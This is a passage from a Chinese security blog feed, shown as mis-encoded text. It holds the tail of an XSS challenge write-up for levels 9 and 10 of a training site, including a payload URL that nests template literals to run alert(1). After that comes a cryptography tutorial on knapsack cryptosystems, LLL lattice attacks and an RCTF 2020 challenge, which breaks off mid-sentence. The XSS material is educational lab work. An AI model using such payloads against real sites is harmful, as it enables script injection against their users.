ä¸ºåŒæ­¥è¾“å‡ºçš„é—®é¢˜ï¼Œä¸€è¡Œé‡Œçš„`çš„ä¸ªæ•°å¾—æ˜¯ä¸€ä¸ªå¥‡æ•°æ‰èƒ½è¾¾åˆ°ä¸€ä¸ªé€ƒé€¸çš„æ•ˆæœï¼›ä½†å¦‚æœæ˜¯å¶æ•°çš„è¯ï¼Œåˆ©ç”¨åµŒå¥—ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°è·¨è¡Œé—­åˆçš„æ•ˆæœã€‚è€ŒåµŒå¥—æˆ‘ä»¬ç”¨å¯¹è±¡ï¼Œæ˜¯{a:`${`çš„å½¢å¼ï¼Œæ‰€ä»¥å¾—æœ‰ä¸€ä¸ª`}æ¥é—­åˆ{`ï¼Œç„¶åè¿˜å¾—æœ‰ä¸€ä¸ª}æ¥é—­åˆ{ï¼Œæ‰€ä»¥å‰åŠæ®µå¾—å‡ºç°`}å’Œ}ï¼Œæ—¢ç„¶æœ‰äº†}ï¼Œé‚£ä¹Ÿå¾—ä¸ª{æ¥é—­åˆã€‚äºæ˜¯å°±æœ‰äº†{a:`}xxxx}çš„å½¢å¼ï¼Œå†è¡¥ä¸Šä¸€ä¸ª`ï¼Œå˜æˆ{a:`}xxxx`}ï¼Œè¿™æ ·è¿™ä¸€æ®µå°±æ˜¯ç‹¬ç«‹çš„äº†ï¼Œå¹¶ä¸”è¡¥ä¸Šçš„è¿™ä¸ª`ä¹Ÿé—­åˆäº†ä¹‹å‰åµŒå¥—çš„`ï¼Œå†æ’å…¥ä¸€ä¸ªalert(1)ï¼Œå°±æœ‰äº†ä¸‹é¢çš„payloadã€‚</p><p><img src="https://i.loli.net/2020/07/16/tzD1glFVO5BHcd7.png" alt="image-20200716154041206"></p><p>è¿™æ ·å­ä¸ŠåŠéƒ¨åˆ†å°±é…åˆçš„å¾ˆå¥½äº†ï¼Œè‡³äºä¸‹é¢ï¼Œ`å‡ºç°äº†å››æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‰é¢å¡«å……ä¸‹ï¼Œå°±èƒ½æŠ¹å»å¤šä½™çš„ä¸¤ä¸ª`ï¼Œä»è€Œå®ç°å¼¹çª—</p><p><img src="https://i.loli.net/2020/07/16/vGb3TEDukaRKS5F.png" alt="image-20200716154225875"></p><p>è¿™ä¸€å…³å¯èƒ½æ€è·¯ä¸æ˜¯å¾ˆé¡ºï¼Œå› ä¸ºpayloadä¹Ÿä¸æ˜¯è‡ªå·±æµ‹å‡ºæ¥çš„ï¼Œæ˜¯å¯¹å‡ºé¢˜äººç»™çš„payloadçš„ç†è§£ã€‚</p><h4 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest10/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest10/</a></p><p>ç›¸è¾ƒäºç¬¬ä¹å…³ï¼Œè¿™ä¸€å…³çš„ç¬¬ä¸‰ä¸ªè¾“å‡ºç‚¹é•¿åº¦åªè¾“å‡ºä¸¤ä½ï¼Œç¬¬å››ä¸ªè¾“å‡ºç‚¹ä¸é™åˆ¶é•¿åº¦</p><p>ç”±äºåªæœ‰ä¸¤ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥`}å¤§æ¦‚æ˜¯æ¯”è¾ƒæœ‰ç”¨çš„ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªæ”¾åœ¨ç¬¬ä¹å…³payloadçš„æœ€å‰é¢</p><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/TOzAIsjX4Qfpxa9.png" alt="image-20200716161451024"></p><p>æå‰é—­åˆäº†ï¼Œäºæ˜¯ï¼Œæƒ³ç€å†åµŒå¥—ä¸€å±‚ï¼Ÿåˆšå¥½ä¹Ÿå¤šäº†ä¸¤å±‚`}ï¼Œè¿™æ ·æœ€åä¸€è¡Œçš„alert(1)å°±å¯ä»¥å‡ºæ¥äº†</p><p>payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest1<span class="number">0</span>/?px=<span class="string">`&#125;\%27-&#123;a:`</span>&#125;-alert(<span class="number">1</span>)//<span class="string">`&#125;-&#123;a:`</span>$&#123;<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E//</span><br></pre></td></tr></table></figure><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/E4MoUlckhSyFW21.png" alt="image-20200716161840912"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™é‡Œæ˜¯å¯¹è¿™å‡ ä¸ªå…³å¡çš„çŸ¥è¯†ç‚¹çš„ç®€å•æ€»ç»“å­</p><p>ç¬¬ä¸€å…³æ˜¯ä¸€ä¸ªç®€å•çš„DOMå‹XSSï¼Œè¿™é‡Œåªéœ€è¦è¿›è¡Œä¸€ä¸ªç®€å•çš„é—­åˆæ“ä½œå°±å¯ï¼Œç„¶åç”¨åˆ°çš„å–å‚å‡½æ•°æ˜¯location.hashï¼Œæ‰€ä»¥å¯¹JavaScriptéœ€è¦æœ‰ä¸€å®šçš„ç†Ÿæ‚‰ã€‚</p><p>ç¬¬äºŒå…³æ˜¯è€ƒç‚¹æ˜¯ä¸€ä¸ªdomæ“ä½œ</p><p>ç¬¬ä¸‰å…³é™¤äº†é—­åˆå¤–ï¼Œè¿˜æœ‰JavaScriptçš„å­—ç¬¦ä¸²ä¸è¿ç®—ç¬¦ç›¸å…³çš„çŸ¥è¯†ï¼šç”±äºJavaScriptæ˜¯ä¸ªå¼±ç±»å‹ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²ä¹‹é—´ä¹Ÿå¯ä»¥è¿›è¡Œè¿ç®—æ“ä½œï¼Œä¹Ÿå¯ä»¥æ‹¿æ¥åšä¸€ç§å˜ç›¸çš„æ‹¼æ¥</p><p>ç¬¬å››å…³å‡ºç°äº†å­—ç¬¦å‹çš„è¿ç®—ç¬¦ä»¥åŠæ¨¡æ¿å­—ç¬¦ä¸²ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼Œä¸è¿‡æ¨¡æ¿å­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦è‡³å°‘ä¸¤ä¸ªå¯æ§è¾“å‡ºç‚¹</p><p>ç¬¬äº”å…³æœ‰ä¸€ä¸ªé‡å®šå‘çš„å°å‘ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ã€‚è¿™é‡Œä¸»è¦ä¹Ÿæ˜¯å› ä¸ºå¯¹å‚æ•°è¿‡æ»¤çš„ä¸ä¸¥æ ¼å¯¼è‡´çš„xssï¼Œç„¶åè€ƒç‚¹ä¹Ÿæ˜¯å¯¹è¾“å…¥ç‚¹é—´çš„ç›¸äº’é…åˆä»¥è¾¾åˆ°åˆ©ç”¨æ•ˆæœå­</p><p>ç¬¬å…­å…³ä¸»è¦åˆ©ç”¨çš„æ˜¯Jsçš„æ­£åˆ™è¡¨è¾¾å¼ã€æ¢è¡Œç¬¦ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥åŠå¯¹æœåŠ¡ç«¯å…¶ä»–æ–‡ä»¶çš„ä¸€äº›åˆ©ç”¨ï¼ˆæ¯”å¦‚ç”¨äº†ç¬¬äº”å…³çš„user.php)</p><p>ç¬¬ä¸ƒå…³æ˜¯å¯¹<code>&lt;!-- &lt;script&gt;</code>ä»¥åŠæ¨¡æ¿å­—ç¬¦ä¸²æ€§è´¨çš„åˆ©ç”¨ï¼Œè¿™äº›è¿ç”¨ä¹Ÿéƒ½æœ‰åœ¨åé¢çš„å…³å¡å‡ºç°</p><p>ç¬¬å…«å…³æœ‰å››ä¸ªåŒæ­¥è¾“å‡ºç‚¹äº†ï¼Œè¿™ä¸€å…³çš„åˆ©ç”¨éš¾åº¦ä¹Ÿæå‡äº†ä¸€ä¸ªæ¡£æ¬¡ï¼ŒåŒæ—¶ä¹Ÿè®©æˆ‘ä»¬å¯¹<code>&lt;!-- &lt;script&gt;</code>æœ‰äº†æ›´æ·±å±‚æ¬¡çš„ç†è§£ã€‚</p><p>ç¬¬ä¹å…³åœ¨ç¬¬å…«å…³çš„åŸºç¡€ä¸Šå¯¹åé¢ä¸¤ä¸ªè¾“å‡ºç‚¹è¿›è¡Œäº†ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åƒç¬¬å…«å…³ä¸€æ ·é—­åˆå‰é¢çš„<code>&lt;script&gt;</code>ï¼Œå†è‡ªå·±å†™ä¸€ä¸ª<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>æ¥å¼¹çª—ï¼Œåªèƒ½åœ¨ä»–ç»™å¥½çš„<code>&lt;script&gt;</code>æ ‡ç­¾é—´è¿›è¡Œå¼¹çª—ã€‚è¿™é‡Œç”¨åˆ°äº†JavaScriptçš„åµŒå¥—ç›¸å…³çš„æ€§è´¨</p><p>ç¬¬åå…³åœ¨ç¬¬ä¹å…³çš„åŸºç¡€ä¸Šå¯¹åé¢ä¸¤ä¸ªè¾“å‡ºç‚¹çš„é•¿åº¦åšäº†é™åˆ¶ï¼Œè¿™é‡Œè¿‡å…³çš„paylaodä¸ç¬¬ä¹å…³ç›¸æ¯”å°±æ˜¯ç”¨åˆ°äº†æ›´å¤šä¸€å±‚çš„åµŒå¥—ã€‚</p><p>&emsp;&emsp;å…¶å®è¿™é‡Œåå…³åšä¸‹æ¥ï¼Œå¹¶æ²¡æœ‰ç”¨åˆ°XSSç‰¹æ®Šçš„bypasså§¿åŠ¿ï¼Œä¸»è¦è¿˜æ˜¯å¯¹JavaScriptçš„ä¸€äº›åŸºç¡€æ€§è´¨åšäº†è¯¦ç»†çš„äº†è§£å­¦ä¹ ï¼Œæ¯•ç«Ÿè¿™é‡Œä¹Ÿéƒ½æ˜¯ä¸€äº›åå°„å‹ã€DOMå‹XSSï¼Œå¯èƒ½åœ¨å®é™…çš„æ¼æ´æŒ–æ˜ä¸­å¹¶æ²¡æœ‰å¾ˆå¤§çš„ç”¨å¤„ï¼Œåˆ©ç”¨èµ·æ¥ä¹Ÿç›¸å¯¹å›°éš¾ï¼ˆå¾ˆå¤šå‚å•†ä¹Ÿä¸æ”¶ï¼‰ï¼Œä½†å¯¹äºæˆ‘è¿™ä¸ªåˆå­¦è€…æ¥è¯´è¿˜æ˜¯å—ç›Šè‰¯å¤šã€‚</p><h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>&emsp;&emsp;æ€»çš„æ¥çœ‹ï¼Œåœ¨åº”ç”¨ä¸Šï¼Œå­˜å‚¨å‹XSS &gt; DOMå‹XSS â‰ˆåå°„å‹XSSã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå› ä¸ºå­˜å‚¨å‹XSSæœ€æŒä¹…ï¼Œè€Œä¸”æ›´ä¸ºéšè”½ï¼Œå› ä¸ºæ˜¯å­˜åœ¨æ•°æ®åº“å½“ä¸­çš„ï¼Œè§¦å‘çš„urlå½“ä¸­æ²¡æœ‰å¸¦jsæˆ–è€…å…¶ä»–çš„htmlä»£ç ã€‚ç„¶ååå°„å‹XSSå’ŒDOMå‹XSSï¼Œå› ä¸ºå®ƒä»¬éƒ½éœ€è¦åœ¨urlä¸­åŠ å…¥jsä»£ç æ‰èƒ½å¤Ÿè§¦å‘ï¼Œæ‰€ä»¥éœ€è¦ä¸äººäº¤äº’<del>é’“é±¼</del>æ‰èƒ½äº§ç”Ÿæ•ˆæœï¼Œå¦åˆ™ä¹Ÿåªèƒ½æ˜¯è‡ªå·±æ—¥è‡ªå·±ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå°å±‹ </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ knapsack</title>
      <link href="/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bknapsack%20/"/>
      <url>/2020/06/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bknapsack%20/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/207798" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><p>ACMä¸­çš„èƒŒåŒ…é—®é¢˜æ˜¯ä¸€ç§ç»„åˆä¼˜åŒ–çš„NPå®Œå…¨é—®é¢˜ï¼Œè€Œåœ¨å¯†ç å­¦ä¸­ï¼Œä¹Ÿæœ‰å¯¹èƒŒåŒ…é—®é¢˜çš„åº”ç”¨ã€‚</p><h2 id="Subset-sum-problems-and-knapsack-cryptosystems"><a href="#Subset-sum-problems-and-knapsack-cryptosystems" class="headerlink" title="Subset-sum problems and knapsack cryptosystems"></a>Subset-sum problems and knapsack cryptosystems</h2><p>å¯†ç å­¦ä¸­çš„åˆ©ç”¨knapsack problemçš„åŠ å¯†ã€‚å¤§æ„å°±æ˜¯ï¼Œä½ å…¬å¼€ä¸€ä¸ªåºåˆ—ï¼Œç„¶åä½ æŠŠä½ çš„æ¶ˆæ¯è½¬ä¸ºäºŒè¿›åˆ¶ï¼Œå¦‚æœä½ æ¶ˆæ¯çš„è¿™ä¸€ä½æ˜¯1ï¼Œå°±ä»ä½ åºåˆ—ä¸­å–å‡ºå¯¹åº”ä½ç½®çš„å€¼ï¼Œæœ€åå¯†æ–‡å°±æ˜¯ä½ æ‰€æœ‰å–å‡ºçš„å€¼çš„å’Œã€‚</p><p>ä½†æ˜¯è¿™æ ·å°±äº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼ŒåŠ å¯†æ˜¯åŠ è¿‡å»äº†ã€‚é‚£è¯¥æ€ä¹ˆè§£å¯†å‘¢ï¼Ÿ</p><p>è›®åŠ›æ”»å‡»çš„æ—¶é—´å¤æ‚åº¦æ˜¯$Oï¼ˆ2^nï¼‰$,å°±ç®—ä¸­é€”ç›¸é‡ä¹Ÿåªèƒ½é™ä½åˆ°$O(2^{\frac{n}{2}})$ã€‚å¤ªéš¾äº†ã€‚ã€‚ã€‚</p><p>é‚£Aliceæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿå…¬é’¥å¯†ç ç³»ç»Ÿå¦‚ä½•ä½“ç°å‘¢ï¼Ÿ</p><p>è¿™å°±çœ‹Aliceå¯¹åºåˆ—çš„é€‰æ‹©äº†ã€‚å¥¹ç”¨çš„æ˜¯è¶…é€’å¢åºåˆ—ã€‚ä»€ä¹ˆæ˜¯è¶…é€’å¢åºåˆ—å‘¢ï¼Ÿå°±æ˜¯åä¸€é¡¹â‰¥å‰ä¸€é¡¹çš„ä¸¤å€ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œåä¸€é¡¹å¤§äºå‰é¢çš„æ‰€æœ‰é¡¹ä¹‹å’Œã€‚</p><p>æœ‰è¶…é€’å¢åºåˆ—åï¼Œç»™ä½ ä¸€ä¸ªå¯†æ–‡ï¼Œä½ åªéœ€è¦ä¸€é¡¹ä¸€é¡¹å¯¹æ¯”è¿‡æ¥ï¼Œä½ å°±èƒ½çŸ¥é“åŠ å¯†è€…é€‰å–çš„å…ƒç´ æ˜¯å“ªå‡ ä¸ªäº†ã€‚</p><p>è¿™ä¸éš¾ç†è§£ã€‚æˆ‘ä»¬å°†åºåˆ—ä¸­çš„æ¯ä¸€é¡¹æ”¾åˆ°äºŒè¿›åˆ¶ä¸‹å°±å¾ˆæ˜æ˜¾ã€‚å¦‚æœç¬¬ä¸€é¡¹çš„ä½é•¿æ˜¯2ï¼Œé‚£ç¬¬äºŒé¡¹çš„ä½é•¿å°±è‡³å°‘æ˜¯3ï¼Œå¦‚æœç¬¬äºŒé¡¹ä½é•¿æ˜¯3ï¼Œé‚£ä¹ˆç¬¬ä¸‰é¡¹çš„ä½é•¿è‡³å°‘æ˜¯4ã€‚å¦‚æœä½ çš„å¯†æ–‡æœ€åæ˜¯ä¸ª2ä½é•¿çš„ï¼Œé‚£åŠ å¯†è€…å¿…å®šæ˜¯æ²¡æœ‰ç”¨åˆ°ç¬¬ä¸‰é¡¹ï¼Œå¿…å®šæ˜¯ç”¨åˆ°äº†ç¬¬äºŒé¡¹ï¼Œè‡³äºæœ‰æ²¡æœ‰ç”¨åˆ°ç¬¬ä¸€é¡¹ï¼Œé‚£å°±çœ‹å¯†æ–‡å‡æ‰ç¬¬äºŒé¡¹ä¹‹åè¿˜æœ‰æ²¡æœ‰å‰©ä¸‹æ¥äº†ã€‚ã€å½“ç„¶ï¼Œè¿™åœ¨æ¯ä¸€é¡¹åªèƒ½ç”¨ä¸€æ¬¡çš„å¤§å‰æä¸‹ã€‘</p><h3 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h3><p>Aliceå‡†å¤‡åŠ å¯†äº†ï¼Œé¦–å…ˆå¥¹å…ˆæ•´äº†ä¸€ä¸ªè¶…é€’å¢åºåˆ—ï¼Œ$r = (r_1,r_2,,,r_n)$ï¼Œç„¶åå¥¹æ•´äº†ä¸¤ä¸ªå¤§æ•°Aå’ŒBï¼Œå…¶ä¸­è¦æ±‚$B&gt;2r_n$ ä¹Ÿå°±æ˜¯Bå¤§äºè¿™ä¸ªè¶…é€’å¢åºåˆ—ä¹‹å’Œå•¦ã€‚ç„¶åè¦éœ€è¦$gcd(A,B)=1$ï¼Œå› ä¸ºä¹‹åè¦æ±‚ä¸€ä¸ªAåœ¨Bä¸‹çš„é€†ã€‚</p><h3 id="encryption"><a href="#encryption" class="headerlink" title="encryption"></a>encryption</h3><p>Aliceè¦åŠ å¯†äº†ï¼Œå¥¹å…ˆç”¨å¥¹çš„Aå’Œå¥¹çš„è¶…é€’å¢åºåˆ—ç”Ÿæˆä¸€ä¸ªæ–°çš„åºåˆ—Mï¼Œå…¶ä¸­$M_i \equiv Ar_i \pmod B$</p><p>è¿™ä¸ªæ–°çš„åºåˆ—å°±æ˜¯Aliceçš„å…¬é’¥äº†ï¼Œå¥¹æŠŠè¿™ä¸ªåºåˆ—ç”©ç»™Bobï¼Œç„¶åBobæŒ‰ç…§ä¹‹å‰æè¿°çš„æ–¹å¼ï¼Œç”¨è¿™ä¸ªåºåˆ—å’Œä»–çš„æ˜æ–‡ç”Ÿæˆå¯†æ–‡$S = x*M = \sum \limits_{i=1}^{n}x_iM_i$ï¼Œç„¶åæŠŠè¿™ä¼ ç»™Alice</p><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>Aliceè¦è§£å¯†äº†ï¼Œå¥¹æ‹¿åˆ°äº†è¿™ä¸ªå¯†æ–‡Sï¼Œç„¶åè®¡ç®—</p><p>$Sâ€™ \equiv A^{-1}S \equiv A^{-1}\sum_{i=1}^{n}x_iM_i\equiv A^{-1}\sum_{i=1}^{n}x_iAr_i\equiv \sum_{i=1}^{n}x_ir_i \pmod B$</p><p>æ‰€ä»¥è¿™ä¸ª$Sâ€™$å°±æ˜¯å¯†æ–‡åœ¨è¶…é€’å¢åºåˆ—ä¸‹çš„å€¼äº†ï¼Œä¹‹åå†åƒä¹‹å‰é‚£æ ·åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª$Sâ€™$å’Œåºåˆ—é‡Œé¢æ¯ä¸€é¡¹çš„å…³ç³»å°±èƒ½è§£å‡ºæ˜æ–‡äº†ã€‚ã€è®°å¾—ä»åºåˆ—å¤§çš„ä¸€ç«¯å¼€å§‹åˆ¤æ–­ï¼Œå¦‚æœæ»¡è¶³å…³ç³»åˆ«å¿˜äº†å‡æ‰é‚£ä¸€é¡¹å†åˆ¤æ–­ä¸‹ä¸€é¡¹ã€‘</p><p>ä¼ªä»£ç èµ°ä¸€æ³¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reverse(r):</span><br><span class="line"><span class="keyword">if</span> s &gt;= i:</span><br><span class="line">        m = <span class="string">'1'</span> + m</span><br><span class="line">        s -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = <span class="string">'0'</span> + m</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p>æ¥ä¸ªæ€»ä½“æµç¨‹</p><p><img src="https://i.loli.net/2020/05/26/7HwAdyNEGqDKLat.png" alt></p><h3 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h3><p>åŒRSAä¸€æ ·ï¼Œè¿™é‡Œå¯¹å‚æ•°çš„é€‰æ‹©ä¹Ÿè¦æ…é‡ï¼Œä¸ç„¶ä¼šå‡ºç°è®¸å¤šå‡ºäººæ„æ–™çš„é—®é¢˜ã€‚</p><p>å…·ä½“å®ä¾‹å¯å‚è€ƒ<a href="https://www.anquanke.com/post/id/206493#h3-11" target="_blank" rel="noopener">BJD3rd-knapsack</a></p><p>è¿™é‡Œç”±äºå¯¹å‚æ•°Açš„ä¸å½“é€‰æ‹©ï¼Œå¯¼è‡´åºåˆ—ä¸­è¾ƒå°çš„é¡¹ä¹˜ä»¥Aåå¹¶æ²¡æœ‰è¢«Bæ¨¡æ‰ï¼Œä¹Ÿå°±å¯¼è‡´äº†å‚æ•°Açš„æ³„éœ²ã€‚</p><p>å¹¶ä¸”ç”±äºè¿™é‡Œçš„è¶…é€’å¢åºåˆ—çš„ç”Ÿæˆè§„åˆ™è¿‡äºç®€å•ï¼Œåªæ˜¯ä¸æ–­åœ°æ•´é™¤2ï¼Œæ‰€ä»¥æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨åŠ å¯†åçš„åºåˆ—è½»æ˜“çš„è®¡ç®—å‡ºBæ¥ã€‚</p><h3 id="further-more"><a href="#further-more" class="headerlink" title="further more"></a>further more</h3><p>ä¹‹å‰æåˆ°Aliceæœ€å¼€å§‹æ•´çš„ä¸€ä¸ªæ— åºçš„åºåˆ—ï¼Œç”±äºè¿™ç©æ„å„¿æ²¡æœ‰é™·é—¨(trapdoor)ï¼Œå› æ­¤è¿™æ— æ³•æˆä¸ºä¸€ä¸ªå¯†ç ç³»ç»Ÿã€‚ä½†è‡ªä»æœ‰å…³LLLçš„paperå‘è¡¨åï¼ŒåŸºäºèƒŒåŒ…çš„å¯†ç ç³»ç»Ÿå‡ºç°äº†ä¸€ä¸ªå¤§weaknessï¼Œ</p><p>è¿™é‡Œç®€çŸ­çš„ä»‹ç»ä¸‹Eveæ€ä¹ˆå»è§£å†³è¿™ä¸ªæ— åºåºåˆ—çš„èƒŒåŒ…é—®é¢˜ã€‚ä¸ç®¡æ˜¯åºåˆ—æœ¬èº«æ— åºï¼Œè¿˜æ˜¯è¶…é€’å¢åºåˆ—åŠ å¯†åæ˜¾å¾—æ— åºçš„åºåˆ—ã€‚</p><p>Eveå…ˆæ„é€ äº†ä¸€ä¸ªçŸ©é˜µ$M =<br>\begin{bmatrix}<br>2&amp;0&amp;0&amp;\dots&amp;0&amp;0&amp;m_1 \newline<br>0&amp;2&amp;0&amp;\dots&amp;0&amp;0&amp;m_2 \newline<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots \newline<br>0&amp;0&amp;0&amp;\dots&amp;2&amp;0&amp;m_{n-1}\newline<br>0&amp;0&amp;0&amp;\dots&amp;0&amp;2&amp;m_{n}\newline<br>1&amp;1&amp;1&amp;\dots&amp;1&amp;1&amp;S\newline<br>\end{bmatrix}$</p><p>å…¶ä¸­è¿™ä¸ª$m_1,m_2,m_3â€¦$å°±æ˜¯é‚£ä¸ªæ— åºåºåˆ—ï¼ŒSå°±æ˜¯å¯†æ–‡</p><p>ç„¶åEveä»è¿™ä¸ªçŸ©é˜µä¸­ï¼Œå°†æ¯ä¸€æ¡è¡Œå‘é‡åˆ’åˆ†å‡ºæ¥ï¼Œåˆ†åˆ«ä¸º$V_1,V_2,â€¦,V_n,V_{n+1}$</p><p>æˆ‘ä»¬ç°åœ¨å‡è®¾å‘é‡$x = (x_1,x_2,x_3,â€¦,x_n)$ æ˜¯æ˜æ–‡ï¼Œ($x_i = 0$ or $1$)</p><p>é‚£ä¹ˆè¿™ä¸ªæ ¼ä¸­å°±ä¼šæœ‰è¿™ä¹ˆä¸€æ¡å‘é‡    </p><p>$t = \sum_ \limits {i=1}^{n}x_iV_i-V_{n+1}=(2x_1-1,2x_2-1,â€¦,2x_n-1,0)$</p><p>è¿™ä¸ªtï¼Œå› ä¸º$2x_i-1=\pm 1$ï¼Œæ‰€ä»¥tçš„æ¨¡é•¿æ˜¯$\sqrt{n}$ï¼Œ</p><p>æ ¹æ®Minkowsklâ€™s First Theorem, </p><p>å³å¯¹äºä»»æ„nç»´æ»¡ç§©æ ¼åŸºï¼Œéƒ½æœ‰   $SVP(L)â‰¤\sqrt n(det(L))^{\frac 1 n}$</p><p>æ˜¾ç„¶tæ˜¯æ ¼Lä¸­çš„çŸ­å‘é‡ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœEveçŸ¥é“å¦‚ä½•æ‰¾åˆ°latticeä¸­çš„çŸ­å‘é‡ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥å®Œæˆç ´è§£äº†ã€‚</p><p>å…³äºæ‰¾åˆ°latticeä¸­çŸ­å‘é‡çš„ç®—æ³•æˆ‘ä»¬ç§°ä¹‹ä¸ºreduction algorithmï¼Œæœ€è‘—åçš„å°±æ˜¯LLL algorithmäº†ï¼Œç„¶åå®ƒè¿˜æœ‰å˜ä½“LLL-BKZã€‚</p><h3 id="variant"><a href="#variant" class="headerlink" title="variant"></a>variant</h3><p>å†åˆšè¿‡å»ä¸ä¹…çš„2020RCTFä¸­å‡ºç°äº†ä¸€é“æœ‰å…³knapsack problem çš„å˜ä½“ï¼Œè¿™é‡Œç”¨çš„ä¸æ˜¯å­é›†ä¹‹å’Œï¼Œè€Œæ˜¯å­é›†ä¹‹ç§¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">sr = random.SystemRandom()</span><br><span class="line">p = getPrime(<span class="number">120</span>)</span><br><span class="line">num = [sr.randint(<span class="number">1</span>,p<span class="number">-1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>)]</span><br><span class="line">secret = sr.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">90</span>)</span><br><span class="line">r = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    <span class="keyword">if</span> (secret &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">        r *= num[i]</span><br><span class="line">        r %= p</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">h = hashlib.sha256(str(secret).encode(<span class="string">'utf-8'</span>)).digest()</span><br><span class="line"></span><br><span class="line">print(p)</span><br><span class="line">print(num)</span><br><span class="line">print(r)</span><br><span class="line">print(bytes_to_long(h)^bytes_to_long(flag))</span><br></pre></td></tr></table></figure><p>è›®åŠ›æ”»å‡»çš„æ—¶é—´å¤æ‚åº¦æ˜¯2çš„90æ¬¡æ–¹ï¼Œå³ä½¿æ˜¯ä¸­é€”ç›¸é‡æ”»å‡»çš„æ—¶é—´å¤æ‚åº¦ä¹Ÿä»ç„¶æœ‰2çš„45æ¬¡æ–¹ï¼Œäºæ­¤åŒæ—¶è¿˜å¾—è€ƒè™‘2çš„45æ¬¡æ–¹çš„ç©ºé—´å¤æ‚åº¦ã€‚</p><p>èµ›åçœ‹äº†å›½å¤–å¤§ä½¬hellmançš„<a href="https://gist.github.com/hellman/73eaee8c5b905b68badba147bfba6287" target="_blank" rel="noopener">è„šæœ¬</a>æ‰æ˜ç™½äº†æœ¬é¢˜çš„è§£æ³•ã€‚</p><p>è¿™ä¸€é“é¢˜çš„åˆ‡å…¥ç‚¹å°±åœ¨äºæ¨¡æ•°pï¼Œé€šè¿‡ä¸æ–­åœ°ncï¼Œç›´åˆ°è·å¾—çš„æ¨¡æ•°på…·æœ‰p-1 smoothçš„æ€§è´¨ï¼ˆä¸ºäº†æ–¹ä¾¿åé¢è§£ç¦»æ•£å¯¹æ•°ï¼‰ï¼Œ</p><p>è¿™ä¸ªæ—¶å€™å†æ‰¾åˆ°ä¸€ä¸ªpçš„åŸæ 